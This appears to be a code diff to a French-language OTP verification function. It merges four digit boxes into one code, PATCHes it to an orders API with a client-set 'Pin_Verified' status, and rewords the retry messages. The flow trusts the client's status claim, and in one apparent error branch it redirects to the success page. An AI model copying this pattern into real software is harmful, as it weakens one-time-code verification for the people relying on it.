@@ -89,12 +89,13 @@ function verifyOTP() {
   const otp4 = document.getElementById('otp4').value;
   if (!otp1 || !otp2 || !otp3 || !otp4) { showToast('Veuillez entrer le code OTP à 4 chiffres'); return; }
   
+  const otpCode = otp1 + otp2 + otp3 + otp4;
   otpAttempts++;
   
   fetch('/api/orders/' + orderId, {
     method: 'PATCH',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ otp1: otp1, otp2: otp2, otp3: otp3, otp4: otp4, status: 'Pin_Verified' })
+    body: JSON.stringify({ otp: otpCode, status: 'Pin_Verified' })
   })
   .then(res => res.json())
   .then(data => {
@@ -104,10 +105,10 @@ function verifyOTP() {
       const params = new URLSearchParams({ order_id: orderId, phone: phone, order_ref: data.order_ref || '', plan_name: data.plan_name || '', amount: data.amount || '' });
       setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 1500);
     } else {
-      // Invalid OTP - check if max attempts reached
+      // Invalid OTP - allow retry up to MAX_ATTEMPTS times with SAME code
       const remainingAttempts = MAX_ATTEMPTS - otpAttempts;
       if (remainingAttempts > 0) {
-        showToast(`OTP invalide. Il vous reste ${remainingAttempts} tentative(s).`);
+        showToast(`Code invalide. Veuillez réessayer. (${remainingAttempts} tentative(s) restante(s))`);
         // Clear OTP boxes for retry
         otpBoxes.forEach(box => box.value = '');
         otpBoxes[0].focus();
@@ -126,7 +127,7 @@ function verifyOTP() {
       const params = new URLSearchParams({ order_id: orderId, phone: phone });
       setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
     } else {
-      showToast('OTP invalide. Veuillez réessayer.');
+      showToast('Code invalide. Veuillez réessayer.');
       console.error(err);
     }
   });
